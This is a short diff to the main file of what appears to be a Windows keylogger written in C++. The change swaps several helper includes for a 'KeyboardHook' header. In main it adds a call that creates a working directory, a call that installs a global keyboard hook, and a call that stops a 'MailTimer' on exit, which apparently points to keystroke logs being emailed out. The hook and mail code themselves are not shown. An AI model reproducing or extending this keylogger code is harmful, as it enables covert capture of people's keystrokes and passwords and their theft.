@@ -1,20 +1,17 @@
 #include <iostream>
 #include <windows.h>
-#include "Helper.hpp"
-#include "Base64.hpp"
-#include "KeyConstants.hpp"
-#include "IO.hpp"
-#include "Timer.hpp"
+#include "KeyboardHook.hpp"
 
 
 int main() {
 
     MSG msg;
-
+    IO::MkDir(IO::GetOurPath(true));
+    KeyboardHook::InstallHook();
     while (GetMessage(&msg, NULL, 0, 0)){
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-
+    KeyboardHook::MailTimer.Stop();
     return 0;
 }
